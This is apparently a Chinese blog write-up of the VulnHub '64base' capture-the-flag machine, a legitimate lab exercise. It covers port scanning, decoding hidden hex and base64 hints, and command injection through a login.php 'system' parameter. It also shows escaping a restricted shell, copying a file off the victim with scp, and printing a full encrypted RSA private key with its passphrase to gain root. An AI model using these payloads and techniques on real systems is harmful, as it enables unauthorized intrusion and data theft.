---
title: 'VulnHub #64base'
metaAlignment: center
coverMeta: out
thumbnailImagePosition: left
date: 2018-05-12 22:56:13
categories:
  - Writeups
  - VulnHub
thumbnailImage: cover.png
keywords:
  - vulnhub
  - writeup
  - 64base
tags:
  - Writeups
---

Official website: [64Base: 1.0.1 ~ VulnHub](https://www.vulnhub.com/entry/64base-101,173/)

<!-- more -->

(I use bridged network because I run the victim VM on different host in my local network.)

## 掃描 IP 位址

```
$ nmap -sP 192.168.31.1/24
...
Nmap scan report for 192.168.31.175
Host is up (0.00039s latency).
MAC Address: 08:00:27:68:E7:F8 (Oracle VirtualBox virtual NIC)
...

$ nmap -p- -sS 192.168.31.175

Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-10 13:14 UTC
Nmap scan report for 192.168.31.175
Host is up (0.025s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
4899/tcp  open  radmin
62964/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 28.62 seconds
```

80 port 有開 http，決定先從網站開始著手 PT。
![](%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8A%E5%8D%8812.22.41.png)

## 大標題

`dmlldyBzb3VyY2UgO0QK` 很有趣，雖然它並沒有 `base64` 編碼最醒目的 `==` 結尾，但大標題就寫著 64base 了還是先嘗試看看，而且 `==` 也不是 `base64` 一定會有的特徵，只是用來彌補編碼字串長度不足的添加字元。

解碼以後得到了作者貼心的提示：`view source ;D`

在原始碼裡可以看到這一段，也就是大標題那段的原始碼：

```html
<div class="site-heading">
	<h1>64base</h1>
	<hr class="small">
	<span class="subheading">dmlldyBzb3VyY2UgO0QK</span>
<!--5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a-->
</div>
```

可以看到一串非常長的編碼，稍微看一下便可以斷言絕對不是 `base64` 編碼，原因很間單，因為整個字串的組成只有數字跟英文字母 `a` ～ `e`。身為一個~~碼農~~，看到這個格式第一個就冒出了十六進位編碼的想法（雖然字串裡並沒有出現 `f`），直接 hex to ASCII，得到一個新的字串：`ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg==`，這個 `base64` 太明顯了，解碼以後成功找到第一個 flag：`flag1{NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg==}`。

這個 flag 內容本身也是一個 `base64` 編碼的字串，解開來是 `64base:Th353@r3N0TdaDr01DzU@reL00K1ing4`，目前還看不出什麼意義，猜想可能是帳號密碼之類的。

## 掃描網站

除了首頁的大標題有明顯的提示以外，其他頁面稍微看了看沒有看到其他明顯的提示，於是開始做一些例行的自動化檢測網站動作，先掃描一下網頁路徑，網站有 `robots.txt`。

![](%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8B%E5%8D%886.07.54.png)

```
$ wget http://192.168.31.175/robots.txt
$ sed '1d' robots.txt | awk '{print $2}' > list.txt
$ dirb http://192.168.31.175 list.txt -S -r
```

除了其他路徑都是空白的資料夾以外，找到 `http://192.168.31.175/admin` 是一個 `HTML WWW-Authenticate` 的登入頁面，嘗試剛剛從 flag1 拿到的帳號密碼仍然無法登入，看來踏進了一個死胡同。在思考如何繞過 `WWW-Authenticate` 的同時，覺得單純透過 `robots.txt` 來爆破網頁路徑應該會有所疏漏，決定擷取網站所有的單詞來猜測/爆破可能的路徑。

```
$ wget http://192.168.31.175 -rq -O 64base
$ html2dic 64base | sort -u > list.txt
$ dirb http://192.168.31.175 list -S -r
...
+ http://192.168.31.175/Imperial-Class (CODE:401|SIZE:461)
...
```

發現了一個新的路徑：`http://192.168.31.175/Imperial-Clas`，同樣也是一個 `HTML WWW-Authenticate` 的登入頁面，再次嘗試 flag1 的帳號密碼，成功登入來到了新畫面。

![](%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8B%E5%8D%886.31.54.png)

在這邊又卡了死胡同很久，直到仔細看了網站的唯一篇文章，在文章最後發現了細節：
![](%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8B%E5%8D%888.07.21.png)

真實的路徑應該要更改成這樣：`http://192.168.31.175/Imperial-Class/BountyHunter`，覺得這個關卡真的太通靈了...
![](%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8B%E5%8D%888.11.52.png)
再拿 flag1 得到的帳號密碼是一次無法登入，檢視原始碼的時候發現有奇特的編碼字串：

```html
<body bgcolor=#000000><font color=#cfbf00>
<form name="login-form" id="login-form" method="post" action="./login.php">
  <fieldset>
  <legend>Please login:</legend>
  <dl>
    <dt>
      <label title="Username">Username:
      <input tabindex="1" accesskey="u" name="function" type="text" maxlength="50" id="5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756" />
      </label>
    </dt>
  </dl>
  <dl>
    <dt>
      <label title="Password">Password:
      <input tabindex="2" accesskey="p" name="command" type="password" maxlength="15" id="584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32" />
            </label>
    </dt>
  </dl>
  <dl>
    <dt>
      <label title="Submit">
      <input tabindex="3" accesskey="l" type="submit" name="cmdlogin" value="Login" />
      <!-- basictoken=52714d544a54626d51315a45566157464655614446525557383966516f3d0a -->
      </label>
    </dt>
  </dl>
  </fieldset>
</form>
```

有一行被註解的 `basictoken`，看起來又是文字轉十六進位的編碼，轉回正常的文字後再一次 `base64` 解碼發現失敗了，回頭再仔細看原始碼發現 `username` 跟 `password` 都多了一個 `id`，看起來一樣的原理，把三個字串串接起來以後再次解碼，即可得到 flag2：`flag2{aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo=}`，flag 再解碼一次拿到一個 [Youtube](https://www.youtube.com/watch?v=vJwytFWA8uA%0A)連結，看不出有什麼明顯的提示，唯一只有標題有提到 `burp`，感覺是在暗示 Burp Suite。

仔細回頭看剛剛的登入頁面，注意到 `form` 表單會提交給 `login.php` 再 302 跳轉回來 `index.php`，用 [cURL](https://curl.haxx.se/) 檢查一下被跳轉的 `login.php` 便發現了 flag3：

```
$ curl -u '64base:Th353@r3N0TdaDr01DzU@reL00K1ing4' http://192.168.31.175/Imperial-Class/BountyHunter/login.php

flag3{NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo=}
```

解釋一下為什麼要用 [cURL](https://curl.haxx.se/)， [cURL](https://curl.haxx.se/) 預設是不會跟隨重新導向的，所以可以得到目標路徑的結果。如果要讓 [cURL](https://curl.haxx.se/) 跟隨重新導向的話，加上 `-L` 參數即可。

再一次的，把 flag3 的內容解碼後得到了新的提示：`53cr3t5h377/Imperial-Class/BountyHunter/login.php?f=exec&c=id`

該路徑畫面除了標題以外其他沒有任何東西，乍看之下感覺又是一個死胡同，但先前才花了很多時間找 flag2，這邊提示還是在文章最後：
![](%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8B%E5%8D%889.09.41.png)

提示說要用 `system` 而不要用 `exec`，那麼把剛剛的路徑修改一下：`http://192.168.31.175/Imperial-Class/BountyHunter/login.php?f=system&c=id`，找到 flag4 。
![](%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8B%E5%8D%889.11.32.png)

Flag4 解碼後得到新的帳號密碼：`64base:64base5h377`。

## 新的方向

感覺 web 的部分現階段挖得差不多了，把目標轉移到一開始用 Nmap 掃描得到其他開啟的 port。首先先試 ssh。

```
$ ssh 64base@192.168.31.175
ssh: connect to host 192.168.31.175 port 22: Connection refused

$ nc 192.168.31.175 22
The programs included with the Fedora GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001

#
```

似乎是一個假的 ssh service，先擱著。再來嘗試 4899 port。

```
$ nc 192.168.31.175 4899
sshhh! ssh! droids!























































So..

You found a way in then...

but, can you pop root?



                                           /~\
                                          |oo )    Did you hear that?
                                          _\=/_
                          ___            /  _  \
                         / ()\          //|/.\|\\
                       _|_____|_        \\ \_/  ||
                      | | === | |        \|\ /| ||
                      |_|  O  |_|        # _ _/ #
                       ||  O  ||          | | |
                       ||__*__||          | | |
                      |~ \___/ ~|         []|[]
                      /=\ /=\ /=\         | | |
      ________________[_]_[_]_[_]________/_]_[_\_________________________
```

目前也還看不出什麼目的，繼續嘗試最後的 62964 port。

```
$ nc 192.168.31.175 62964
SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u3
```

哦！看起來是一個真的 ssh service，立刻嘗試 ssh 指令，密碼就用 flag4 解碼得到的 `64base5h377`，可惜登入失敗了，flag1 的密碼也同樣登入失敗。

```
$ ssh 64base@192.168.31.175 -p62964
64base@192.168.31.175's password:
Permission denied, please try again.
```

> 因為期間機器有重新設定，所以接下來 Victim 的 IP 從 192.168.31.175 改成 192.168.31.184

這裡大概卡了一個多禮拜，才想到這個 VM 的名稱就以 base64 來命名的，何不把 flag4 拿到的密碼再用 base64 邊一次呢？Bingo！密碼就是 `64base5h377` 的 base64 編碼
![](Screen%20Shot%202018-05-12%20at%209.58.10%20PM.png)

進去以後檢查了一下當前目錄、一些常用的指令不可用，發現自己在一個被限制的 shell，檢查環境變數時候發現幾個點：

1.  SHELL 的確是 `/bin/rbash`
2.  PATH 是 `/var/alt-bin`
    ![](Screen%20Shot%202018-05-12%20at%2010.04.13%20PM.png)

`/var/alt-bin` 底下有這些檔案：

```
/var/alt-bin/awk
/var/alt-bin/base64
/var/alt-bin/cat
/var/alt-bin/dircolors
/var/alt-bin/droids
/var/alt-bin/egrep
/var/alt-bin/env
/var/alt-bin/fgrep
/var/alt-bin/file
/var/alt-bin/find
/var/alt-bin/grep
/var/alt-bin/head
/var/alt-bin/less
/var/alt-bin/ls
/var/alt-bin/more
/var/alt-bin/perl
/var/alt-bin/python
/var/alt-bin/ruby
/var/alt-bin/tail
```

有些常用的指令都並不是原本的結果，例如：
![](Screen%20Shot%202018-05-12%20at%2010.08.27%20PM.png)

別擔心，因為 `/usr/bin` 還在而且正確的 find 執行檔也還在，所以我利用 find 指令來看看有沒有以 `flag` 命名的檔案：

```
$ /usr/bin/find / -name "*flag5*" 2>/dev/null
/var/www/html/admin/S3cR37/flag5{TG9vayBJbnNpZGUhIDpECg==}
```

不過當我在寫這篇文章要重現這個步驟時卻失效了，又花了一些時間研究才發現，`/var/alt-bin/droids` 這個檔案很重要，`$ droids` 執行以後會出現 code matrix 的動畫，按 q 鍵可以離開，PATH 環境變數會被更正！這時再執行 `/usr/bin/find` 便可以正常找到 flag。
![](Screen%20Shot%202018-05-12%20at%2010.15.23%20PM.png)
![](Screen%20Shot%202018-05-12%20at%2010.14.31%20PM.png)

照慣例還是看看 flag 轉碼以後是什麼：`Look Inside! :D`

![](Screen%20Shot%202018-05-12%20at%2010.26.21%20PM.png)

看起來是一張圖片，中間有個註解看起來很顯眼，格式像是十六進位，轉回文字看看：
![](Screen%20Shot%202018-05-12%20at%2010.30.33%20PM.png)

看起來這是一個 RSA 的私鑰！在 VM 裡面 rbash 太綁手綁腳了，於是想把檔案拿出來在本機研究。既然可以 SSH 進入 VM，那麼 scp 指令應該可行！

```
$ scp /var/www/html/admin/S3cR37/flag5{TG9vayBJbnNpZGUhIDpECg==} theo@192.168.31.142:~/Desktop/flag5.jpg
```

得到的圖片：
![](flag5.jpg)

剛剛看到的註解讓我有些在意，想看看會不會有完整的 RSA 私鑰：

```
$ exiftool flag5.jpg
ExifTool Version Number         : 10.80
File Name                       : flag5.jpg
Directory                       : .
File Size                       : 192 kB
File Modification Date/Time     : 2018:05:12 22:33:25+08:00
File Access Date/Time           : 2018:05:12 22:36:19+08:00
File Inode Change Date/Time     : 2018:05:12 22:36:12+08:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Comment                         : 4c5330744c5331435255644a546942535530456755464a4a566b46555253424c52566b744c5330744c517051636d396a4c565235634755364944517352553544556c6c5156455645436b52460a5379314a626d5a764f69424252564d744d5449344c554e43517977324d6a46424d7a68425155513052546c475155457a4e6a55335130457a4f44673452446c434d7a553251776f4b625552300a556e684a643267304d464a54546b467a4d697473546c4a49646c4d356557684e4b325668654868564e586c795231424461334a6955566376556d64515543745352307043656a6c57636c52720a646c6c334e67705a59303931575756615457707a4e475a4a55473433526c7035536d64345230686f5533685262336857626a6c7252477433626e4e4e546b5270636e526a62304e50617a6c530a524546484e5756344f58673056453136436a684a624552435558453161546c5a656d6f35646c426d656d56435246706b53586f35524863795a323479553246465a335531656d56734b7a5a490a52303969526a686161444e4e53574e6f6554687a4d5668795254414b61335a4d53306b794e544a74656c64334e47746955334d354b31466856336c6f4d7a52724f45704a566e7031597a46520a51336c69656a56586231553157545532527a5a784d564a6b637a426959315a785446567a5a51704e5533704c617a4e745332465851586c4d574778764e3078756258467856555a4c5347356b0a516b557855326851566c5a704e47497752336c475355785054335a3062585a47596a5172656d68314e6d705056316c49436d73796147524453453554644374705a3264354f57686f4d3270680a52576456626c4e51576e56464e30354b6430525a5954646c553052685a3077784e31684c634774744d6c6c70516c5a7956566834566b31756232494b643168535a6a56435930644c56546b330a65475276636c59795648457261446c4c553278615a5463354f58527956484a475230356c4d4456326545527961576f315658517953324e52654373354f457334533342585441706e645570510a556c424c52326c71627a6b3253455248597a4e4d4e566c7a65453969566d63724c325a714d4546326330746d636d4e574c327834595663725357313562574d7854566870536b316962554e360a62455233436c52425632316863577453526b52355154464956585a30646c4e6c566e46544d533949616d6845647a6c6b4e45747a646e4e71613270326557565256484e7a5a6e4e6b52324e560a4d47684561316833556c647a6332514b4d6d517a5279744f616d3078556a56615445356e556d784f63465a48616d684c517a524263325a59557a4e4b4d486f7964444e4355453035576b39430a54554a6c4f5552344f4870744e58684757546c365633527964677042523342794d454a6f4f45745264323177616c4656597a46685a6e4e78595646594d465649546b7859564446615431644c0a616d63305530457a57454d355a454e4665555a784d464e4a65464671547a6c4d52304e48436a52524e57356a5a6c566f62585a3063586c3164454e7362444a6b5746427a57465a455a54526c0a6230517851327432536b354557544e4c554663725232744f4f5577724f554e516554677252453531626b5a4a6433674b4b3151724b7a64525a7939315546684c6354524e4e6a464a555467770a4d7a52566148565356314d30564846514f57463657444e44527a6c4d65573970516a5a57596b74505a555233546a68686157784d533170436377706d57546c524e6b464e4d584e3562476c360a53444675626e684c5433526155566431636e68715230704353584d324d6e526c6245317259584d356555354e617a4e4d64546478556b6732633364504f584e6b56454a70436974714d4867300a64555261616b706a5a30315965475a694d4863315154593062466c4763303153656b5a714e31686b5a6e6b784f53744e5a54684b525768524f45744f57455233555574456556564d526b39550a63336f4b4d544e575a6b4a4f65466c7a65557731656b6459546e703563566f3053533950547a644e5a575179616a4248656a426e4d6a4670534545764d445a74636e4d795932786b637a5a540a56554a4852585a754f4535705667707955334a494e6e5a46637a5254656d63776544686b5a45643255544278567a463254577455556e557a54336b765a544577526a63304e586845545546550a53314a7353316f32636c6c4954554e34536a4e4a59323530436b56364d45394e57466c6b517a5a4461555976535664305a3252564b32684c65585a7a4e484e4764454e4359327854595764740a5246524b4d6d74615a485530556c4a3357565a574e6d394a546e6f35596e4250646b554b556e677a534656785a6d354c553268796458704e4f56707261556c7264564e6d556e526d615531320a596c52365a6d5a4b56464d30597a513451303831574339535a5559765157464e654774695532524654305a7a53517047646a6c595a476b355532524f6458684853455579527a5249646b706b0a53584279526c5679566c4e7755306b344d48646e636d49794e44567a647a5a6e5647397064466f354d47684b4e47354b4e5746354e304648436c6c7059574531627a63344e7a63765a6e63320a57566f764d6c557a5155526b61564e50516d3072614770574d6b705765484a7665565659596b63315a475a734d32303452335a6d4e7a464b4e6a4a4753484534646d6f4b63557068626c4e720a4f4445334e586f77596d70795746646b5445637a52464e735355707063327851567974355247466d4e316c43566c6c33563149725645457861304d326157564a5154563056544e776269394a0a4d776f324e466f31625842444b3364785a6c52345232646c51334e6e53577335646c4e754d6e41765a5756305a456b7a5a6c46584f46645952564a69524756304d56564d5346427864456c700a4e314e61596d6f3464697451436d5a7553457852646b563353584d72516d59785133424c4d554672576d565654564a4655577443614552704e7a4a49526d4a334d6b6376656e46306153395a0a5a4735786545463562445a4d576e704a5a5646754f48514b4c3064714e477468636b6f78615530355357597a4f57524e4e55396851315a615569395554304a575956493462584a514e315a300a536d39794f57706c53444a305255777764473946635664434d56424c4d48565955416f744c5330744c55564f524342535530456755464a4a566b46555253424c52566b744c5330744c516f3d0a
Image Width                     : 960
Image Height                    : 720
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 960x720
Megapixels                      : 0.691
```

果然有完整的私鑰！馬上把編碼轉換回來：

```
$ echo "4c5330744c5331435255644a546942535530456755464a4a566b46555253424c52566b744c5330744c517051636d396a4c565235634755364944517352553544556c6c5156455645436b52460a5379314a626d5a764f69424252564d744d5449344c554e43517977324d6a46424d7a68425155513052546c475155457a4e6a55335130457a4f44673452446c434d7a553251776f4b625552300a556e684a643267304d464a54546b467a4d697473546c4a49646c4d356557684e4b325668654868564e586c795231424461334a6955566376556d64515543745352307043656a6c57636c52720a646c6c334e67705a59303931575756615457707a4e475a4a55473433526c7035536d64345230686f5533685262336857626a6c7252477433626e4e4e546b5270636e526a62304e50617a6c530a524546484e5756344f58673056453136436a684a624552435558453161546c5a656d6f35646c426d656d56435246706b53586f35524863795a323479553246465a335531656d56734b7a5a490a52303969526a686161444e4e53574e6f6554687a4d5668795254414b61335a4d53306b794e544a74656c64334e47746955334d354b31466856336c6f4d7a52724f45704a566e7031597a46520a51336c69656a56586231553157545532527a5a784d564a6b637a426959315a785446567a5a51704e5533704c617a4e745332465851586c4d574778764e3078756258467856555a4c5347356b0a516b557855326851566c5a704e47497752336c475355785054335a3062585a47596a5172656d68314e6d705056316c49436d73796147524453453554644374705a3264354f57686f4d3270680a52576456626c4e51576e56464e30354b6430525a5954646c553052685a3077784e31684c634774744d6c6c70516c5a7956566834566b31756232494b643168535a6a56435930644c56546b330a65475276636c59795648457261446c4c553278615a5463354f58527956484a475230356c4d4456326545527961576f315658517953324e52654373354f457334533342585441706e645570510a556c424c52326c71627a6b3253455248597a4e4d4e566c7a65453969566d63724c325a714d4546326330746d636d4e574c327834595663725357313562574d7854566870536b316962554e360a62455233436c52425632316863577453526b52355154464956585a30646c4e6c566e46544d533949616d6845647a6c6b4e45747a646e4e71613270326557565256484e7a5a6e4e6b52324e560a4d47684561316833556c647a6332514b4d6d517a5279744f616d3078556a56615445356e556d784f63465a48616d684c517a524263325a59557a4e4b4d486f7964444e4355453035576b39430a54554a6c4f5552344f4870744e58684757546c365633527964677042523342794d454a6f4f45745264323177616c4656597a46685a6e4e78595646594d465649546b7859564446615431644c0a616d63305530457a57454d355a454e4665555a784d464e4a65464671547a6c4d52304e48436a52524e57356a5a6c566f62585a3063586c3164454e7362444a6b5746427a57465a455a54526c0a6230517851327432536b354557544e4c554663725232744f4f5577724f554e516554677252453531626b5a4a6433674b4b3151724b7a64525a7939315546684c6354524e4e6a464a555467770a4d7a52566148565356314d30564846514f57463657444e44527a6c4d65573970516a5a57596b74505a555233546a68686157784d533170436377706d57546c524e6b464e4d584e3562476c360a53444675626e684c5433526155566431636e68715230704353584d324d6e526c6245317259584d356555354e617a4e4d64546478556b6732633364504f584e6b56454a70436974714d4867300a64555261616b706a5a30315965475a694d4863315154593062466c4763303153656b5a714e31686b5a6e6b784f53744e5a54684b525768524f45744f57455233555574456556564d526b39550a63336f4b4d544e575a6b4a4f65466c7a65557731656b6459546e703563566f3053533950547a644e5a575179616a4248656a426e4d6a4670534545764d445a74636e4d795932786b637a5a540a56554a4852585a754f4535705667707955334a494e6e5a46637a5254656d63776544686b5a45643255544278567a463254577455556e557a54336b765a544577526a63304e586845545546550a53314a7353316f32636c6c4954554e34536a4e4a59323530436b56364d45394e57466c6b517a5a4461555976535664305a3252564b32684c65585a7a4e484e4764454e4359327854595764740a5246524b4d6d74615a485530556c4a3357565a574e6d394a546e6f35596e4250646b554b556e677a534656785a6d354c553268796458704e4f56707261556c7264564e6d556e526d615531320a596c52365a6d5a4b56464d30597a513451303831574339535a5559765157464e654774695532524654305a7a53517047646a6c595a476b355532524f6458684853455579527a5249646b706b0a53584279526c5679566c4e7755306b344d48646e636d49794e44567a647a5a6e5647397064466f354d47684b4e47354b4e5746354e304648436c6c7059574531627a63344e7a63765a6e63320a57566f764d6c557a5155526b61564e50516d3072614770574d6b705765484a7665565659596b63315a475a734d32303452335a6d4e7a464b4e6a4a4753484534646d6f4b63557068626c4e720a4f4445334e586f77596d70795746646b5445637a52464e735355707063327851567974355247466d4e316c43566c6c33563149725645457861304d326157564a5154563056544e776269394a0a4d776f324e466f31625842444b3364785a6c52345232646c51334e6e53577335646c4e754d6e41765a5756305a456b7a5a6c46584f46645952564a69524756304d56564d5346427864456c700a4e314e61596d6f3464697451436d5a7553457852646b563353584d72516d59785133424c4d554672576d565654564a4655577443614552704e7a4a49526d4a334d6b6376656e46306153395a0a5a4735786545463562445a4d576e704a5a5646754f48514b4c3064714e477468636b6f78615530355357597a4f57524e4e55396851315a615569395554304a575956493462584a514e315a300a536d39794f57706c53444a305255777764473946635664434d56424c4d48565955416f744c5330744c55564f524342535530456755464a4a566b46555253424c52566b744c5330744c516f3d0a" | xxd -p -r | base64 -D
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,621A38AAD4E9FAA3657CA3888D9B356C

mDtRxIwh40RSNAs2+lNRHvS9yhM+eaxxU5yrGPCkrbQW/RgPP+RGJBz9VrTkvYw6
YcOuYeZMjs4fIPn7FZyJgxGHhSxQoxVn9kDkwnsMNDirtcoCOk9RDAG5ex9x4TMz
8IlDBQq5i9Yzj9vPfzeBDZdIz9Dw2gn2SaEgu5zel+6HGObF8Zh3MIchy8s1XrE0
kvLKI252mzWw4kbSs9+QaWyh34k8JIVzuc1QCybz5WoU5Y56G6q1Rds0bcVqLUse
MSzKk3mKaWAyLXlo7LnmqqUFKHndBE1ShPVVi4b0GyFILOOvtmvFb4+zhu6jOWYH
k2hdCHNSt+iggy9hh3jaEgUnSPZuE7NJwDYa7eSDagL17XKpkm2YiBVrUXxVMnob
wXRf5BcGKU97xdorV2Tq+h9KSlZe799trTrFGNe05vxDrij5Ut2KcQx+98K8KpWL
guJPRPKGijo96HDGc3L5YsxObVg+/fj0AvsKfrcV/lxaW+Imymc1MXiJMbmCzlDw
TAWmaqkRFDyA1HUvtvSeVqS1/HjhDw9d4KsvsjkjvyeQTssfsdGcU0hDkXwRWssd
2d3G+Njm1R5ZLNgRlNpVGjhKC4AsfXS3J0z2t3BPM9ZOBMBe9Dx8zm5xFY9zWtrv
AGpr0Bh8KQwmpjQUc1afsqaQX0UHNLXT1ZOWKjg4SA3XC9dCEyFq0SIxQjO9LGCG
4Q5ncfUhmvtqyutCll2dXPsXVDe4eoD1CkvJNDY3KPW+GkN9L+9CPy8+DNunFIwx
+T++7Qg/uPXKq4M61IQ8034UhuRWS4TqP9azX3CG9LyoiB6VbKOeDwN8ailLKZBs
fY9Q6AM1sylizH1nnxKOtZQWurxjGJBIs62telMkas9yNMk3Lu7qRH6swO9sdTBi
+j0x4uDZjJcgMXxfb0w5A64lYFsMRzFj7Xdfy19+Me8JEhQ8KNXDwQKDyULFOTsz
13VfBNxYsyL5zGXNzyqZ4I/OO7Med2j0Gz0g21iHA/06mrs2clds6SUBGEvn8NiV
rSrH6vEs4Szg0x8ddGvQ0qW1vMkTRu3Oy/e10F745xDMATKRlKZ6rYHMCxJ3Icnt
Ez0OMXYdC6CiF/IWtgdU+hKyvs4sFtCBclSagmDTJ2kZdu4RRwYVV6oINz9bpOvE
Rx3HUqfnKShruzM9ZkiIkuSfRtfiMvbTzffJTS4c48CO5X/ReF/AaMxkbSdEOFsI
Fv9Xdi9SdNuxGHE2G4HvJdIprFUrVSpSI80wgrb245sw6gToitZ90hJ4nJ5ay7AG
Yiaa5o7877/fw6YZ/2U3ADdiSOBm+hjV2JVxroyUXbG5dfl3m8Gvf71J62FHq8vj
qJanSk8175z0bjrXWdLG3DSlIJislPW+yDaf7YBVYwWR+TA1kC6ieIA5tU3pn/I3
64Z5mpC+wqfTxGgeCsgIk9vSn2p/eetdI3fQW8WXERbDet1ULHPqtIi7SZbj8v+P
fnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t
/Gj4karJ1iM9If39dM5OaCVZR/TOBVaR8mrP7VtJor9jeH2tEL0toEqWB1PK0uXP
-----END RSA PRIVATE KEY-----
```

私鑰到手，接下來嘗試用這個私鑰看看能不能以 root 的身份登入 ssh：

```
// 我已經把私鑰存在 key 這個檔案裡了
$ ssh -p62964 root@192.168.31.184 -i key
```

![](Screen%20Shot%202018-05-12%20at%2010.43.32%20PM.png)

都到這一步了結果又要密碼！東想西想想到剛剛看到的那張圖片上面有字：`USE THE FORCE`，嘗試了一下最後用 `usetheforce` 成功登入了 root，flag6 到手。
![](Screen%20Shot%202018-05-12%20at%2010.45.07%20PM.png)

最後 flag6 當然也還是來解碼一下，發現它十六進位 + base64 不斷的循環，重複解碼幾次以後得到最後的明文：`base64 -d /var/local/.luke|less.real` 是一條指令，當然就來去 VM 裡試試，原來是最後的小彩蛋 XDD，滿有趣的。

```
        \ \        / / | | | |  __ \
          \ \  /\  / /__| | | | |  | | ___  _ __   ___
           \ \/  \/ / _ \ | | | |  | |/ _ \| '_ \ / _ \
            \  /\  /  __/ | | | |__| | (_) | | | |  __/
         __  \/ _\/ \___|_|_|_|_____/ \___/|_|_|_|\___| _
         \ \   / /          |  __ \(_)   | | |_   _| | | |
          \ \_/ /__  _   _  | |  | |_  __| |   | | | |_| |
           \   / _ \| | | | | |  | | |/ _` |   | | | __| |
            | | (_) | |_| | | |__| | | (_| |  _| |_| |_|_|
            |_|\___/ \__,_| |_____/|_|\__,_| |_____|\__(_)

_____ _ _ _ __ __ __  _ ___ _   __  ___  __ __  __  _  ___ _ _  __ _________
%=x%= | |V| |_)|_ |_) | |_| |   |_) |_| (_  |_  |_) |  |_| |\| (_  %=x%=x%=x
~~~~~ | | | |  |_ | \ | | | |_  |_) | | __) |_  |   |_ | | | | __) ~~~~~~~~~
LS
                 .-. .-.
               .=========.         E x t e r i o r ,   A e r i a l   V i e w
               ||.-.7.-.||         -----------------------------------------
               ||`-' `-'||
               `========='
                `-'| |`-'8               1 .............. Sensor Suite Tower
          ______   |9|   ______          2 ... Heavy Twin Turbolaser Turrets
         /     /\__| |__/\     \         3 ............. Heavy Laser Turrets
        /  \_ / /  |_|  \ \ _/  \        4 ....... TIE Fighter Launch Chutes
       /___(\\\/         \///)___\       5 ............... Heavy Blast Doors
       \____\\`==========='//____/       6 .................... Guard towers
       /     '/ .-------. \\     \       7 ........ Shuttle Landing Platform
    __/     //. \`+---+'/ .\\     \__    8 ........... AT-AT Docking Station
   /\ \    ///x`.\|___|/.'x\\\    / /\   9 ................. Connecting Ramp
  /  \ \  //`-._//|   |\\_.2'\\  / /  \
 /  _.-==='_____//.-=-.\\_____`===-._  \
 \   `-===.\-.  \ `-=1' /  .-/.===-' 3 / The pre-fabricated,  multi-function
  \  / /  \\\ \  \.===./  /4///  \ \  /  Imperial garrison base is the back-
   \/_/    \\\ | /.---.\ | ///    \_\/   bone of the  Empire's  occupational
      \     \\\|/ |_m_| \|///     /      forces. These heavily-armoured for-
       \_____\=============/_____/       tresses have  walls up to 10 meters
       /____///    ___    \\\____\       thick  to  guard   against   ground
       \   (_//\__|||||__/\\_)   /       assaults,  and  powerful  deflector
        \  /  \|,,|||||,,|/  \  /        shields  protect  them  for  air or
         \_____|  | 5 | 6|_____/         space attacks.
               `--'   `--'
____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                           U           E x t e r i o r ,   S i d e   V i e w
                          /_\          -------------------------------------
                       1 [___]
                         :`:':           1 .............. Sensor Suite Tower
                         `:::'           2 ... Heavy Twin Turbolaser Turrets
                  _       :_:       _    3 ............. Heavy Laser Turrets
                =[ ]2     [%]      [ ]=  4 ....... Tie Fighter Launch Chutes
                 :=:      :=:      :=:   5 ............... Heavy Blast Doors
                _|_|_   __| |__   _|_|_  6 .................... Guard Towers
               / /XX|\ /__|_|__\ /|XX\ \
         3    /4/XXX| | _/___\_ | |XXX\ \             7 ....... AT-AT Walker
    --===____/--===X|_|/_______\|_|X===--\____===--   8 ........ AT-ST Scout
     /__| |     /l_\\             //_|\     |_|__\
    /~~.' |    /:'  \\   _____   //  `:\    | `.  \
   /   | .'   / |    \\==|||||==//    | \   `. |   \   7    8
  /   .' |   / .'     |  ||5|| 6|     `. \   | `.   \  xx=   _
